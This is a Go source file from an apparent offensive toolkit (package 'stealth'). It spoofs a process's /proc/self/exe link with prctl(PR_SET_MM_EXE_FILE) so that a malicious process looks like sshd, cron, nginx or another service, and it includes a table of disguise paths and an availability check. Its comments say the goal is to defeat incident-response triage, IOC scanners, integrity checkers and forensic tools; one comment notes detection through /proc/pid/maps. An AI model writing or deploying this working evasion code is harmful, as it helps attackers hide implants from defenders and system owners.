package stealth

// /proc/self/exe Spoofing via PR_SET_MM
//
// OPSEC rationale: When an analyst runs `ls -la /proc/[pid]/exe` or
// `readlink /proc/[pid]/exe`, they see the path to our binary on disk.
// This is one of the first things checked during triage. By using
// prctl(PR_SET_MM, PR_SET_MM_EXE_FILE), we change the kernel's record
// of our executable path to point to a legitimate system binary.
//
// After this, `readlink /proc/self/exe` returns e.g. "/usr/sbin/sshd"
// instead of our actual binary path. This defeats:
//   - Manual IR triage (ls -la /proc/pid/exe)
//   - Automated IOC scanners that hash the exe link target
//   - Process integrity checkers that compare exe link to expected paths
//   - Forensic tools that use exe link for binary extraction
//
// Capability required: CAP_SYS_RESOURCE
// Kernel requirement: 3.3+ (PR_SET_MM_EXE_FILE added in 3.3)
//
// Detection:
//   - Comparing /proc/pid/exe against /proc/pid/maps (maps still shows real binary)
//   - The target binary must exist and be executable

import (
	"fmt"
	"os"
	"syscall"
	"unsafe"
)

// prctl constants for MM manipulation.
const (
	prSETMM        = 35 // PR_SET_MM
	prSETMMExeFile = 13 // PR_SET_MM_EXE_FILE
)

// SpoofExeLink changes /proc/self/exe to point to targetPath.
// The target must be an existing regular executable file.
// After this call, readlink("/proc/self/exe") returns targetPath.
//
// Common targets:
//   - "/usr/sbin/sshd"
//   - "/usr/sbin/cron"
//   - "/lib/systemd/systemd-resolved"
//   - "/usr/sbin/nginx"
func SpoofExeLink(targetPath string) error {
	// Open the target binary — the kernel needs a valid fd
	fd, err := syscall.Open(targetPath, syscall.O_RDONLY|0x200000, 0)
	if err != nil {
		return fmt.Errorf("open %s: %v", targetPath, err)
	}
	defer syscall.Close(fd)

	// prctl(PR_SET_MM, PR_SET_MM_EXE_FILE, fd, 0, 0)
	_, _, errno := syscall.Syscall6(
		syscall.SYS_PRCTL,
		uintptr(prSETMM),
		uintptr(prSETMMExeFile),
		uintptr(fd),
		0, 0, 0,
	)
	if errno != 0 {
		return fmt.Errorf("prctl PR_SET_MM_EXE_FILE: %v", errno)
	}

	return nil
}

// SpoofExeLinkForService changes /proc/self/exe to match a known service binary.
// Falls back through common paths for the given service name.
func SpoofExeLinkForService(service string) error {
	paths, ok := serviceExePaths[service]
	if !ok {
		return fmt.Errorf("unknown service: %s", service)
	}

	for _, path := range paths {
		if _, err := os.Stat(path); err == nil {
			return SpoofExeLink(path)
		}
	}

	return fmt.Errorf("no binary found for service %s", service)
}

// serviceExePaths maps service names to possible binary locations.
// Multiple paths handle different distros (Debian, RHEL, Alpine, etc.).
var serviceExePaths = map[string][]string{
	"sshd": {
		"/usr/sbin/sshd",
		"/usr/bin/sshd",
	},
	"nginx": {
		"/usr/sbin/nginx",
		"/usr/bin/nginx",
	},
	"cron": {
		"/usr/sbin/cron",
		"/usr/sbin/crond",
	},
	"systemd-resolved": {
		"/lib/systemd/systemd-resolved",
		"/usr/lib/systemd/systemd-resolved",
	},
	"apache2": {
		"/usr/sbin/apache2",
		"/usr/sbin/httpd",
	},
	"postgres": {
		"/usr/lib/postgresql/15/bin/postgres",
		"/usr/lib/postgresql/14/bin/postgres",
		"/usr/bin/postgres",
	},
	"mysql": {
		"/usr/sbin/mysqld",
		"/usr/bin/mysqld",
	},
}

// GetCurrentExeLink reads the current /proc/self/exe symlink target.
// Useful for verifying the spoof worked.
func GetCurrentExeLink() (string, error) {
	return os.Readlink("/proc/self/exe")
}

// ExeSpoofAvailable checks if PR_SET_MM_EXE_FILE is available.
// Tests with our own exe (which should always work if we have CAP_SYS_RESOURCE).
func ExeSpoofAvailable() bool {
	// Read our current exe link
	current, err := os.Readlink("/proc/self/exe")
	if err != nil {
		return false
	}

	// Try to set it to itself (no-op in effect, but tests the prctl)
	fd, err := syscall.Open(current, syscall.O_RDONLY|0x200000, 0)
	if err != nil {
		return false
	}
	defer syscall.Close(fd)

	_, _, errno := syscall.Syscall6(
		syscall.SYS_PRCTL,
		uintptr(prSETMM),
		uintptr(prSETMMExeFile),
		uintptr(fd),
		0, 0, 0,
	)
	return errno == 0
}

// PR_SET_MM_MAP can also set arg_start/arg_end/env_start/env_end pointers,
// which control what /proc/self/cmdline and /proc/self/environ show.
// This is a more comprehensive approach than argv overwrite but requires
// careful memory management. Reserved for future implementation.

// prSetMM sub-operations for reference (PR_SET_MM_START_CODE=1 through PR_SET_MM_ENV_END=11).
// Reserved for future prctl(PR_SET_MM, ...) implementation.
var _ = unsafe.Sizeof(0) // keep unsafe imported for future use
